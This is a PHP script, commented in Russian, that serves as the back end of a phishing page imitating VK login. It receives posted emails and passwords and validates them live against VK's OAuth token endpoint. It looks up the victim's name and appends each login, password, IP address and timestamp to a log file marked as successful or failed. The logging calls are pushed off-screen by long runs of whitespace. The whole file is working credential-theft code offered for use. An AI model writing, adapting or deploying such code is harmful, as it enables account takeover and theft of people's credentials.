<?PHP
$baza = "yabazka.php"; // ПУТЬ ДО БАЗЫ
$chvalid = 1; //ПРОВЕРЯТЬ ЛИ ВАЛИД? = 1 - ПРОВЕРЯТЬ, = 0 - НЕ ПРОВЕРЯТЬ.
 $num = 0;
 $email = $_POST['email'];
 $password = $_POST['password'];
 $key = $_POST['captcha_key'];
 $sid = $_POST['captcha_sid'];
 $res=curl('https://oauth.vk.com/token?grant_type=password&client_id=CLIENT_ID&client_secret=CLIENT_SECRET&username='.$email.'&password='.$password);
 $lo='access_token';
 $pos2 = strripos($res, $lo);
 $res3 = json_decode($res, true);
 $kek = $res3['captcha_sid'];
If (isset($_POST['email'])){ 
 $ip=$_SERVER['REMOTE_ADDR'];
 $time = date("H:i | d.m.Y");
if ($chvalid == 1) {
if ($pos2 === false) {
 $mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip| $time | Неудачно</div>\n";																																																								$fp = fopen($baza, "a"); 
 $test = fwrite($fp, $mytext);
 fclose($fp);
 $num = 1;
}else{
$res = json_decode($res, true);
$id=$res['user_id'];
$name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counters');
$name = json_decode($name, true);

$fulname=$name['response']['0']['first_name'].' '.$name['response']['0']['last_name'];
$mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip | $time | Удачно</div>\n";																																																								$fp = fopen($baza, "a");
 $test = fwrite($fp, $mytext);
 fclose($fp);

$num = 2;
 }
}else{
$mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip | $time | ХЗ</div>\n";																																																								$fp = fopen($baza, "a");
 $test = fwrite($fp, $mytext);
 fclose($fp);
 $num = 2;
}
}



function curl($url){

$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
$response = curl_exec( $ch );
curl_close( $ch );
return $response;
}
?>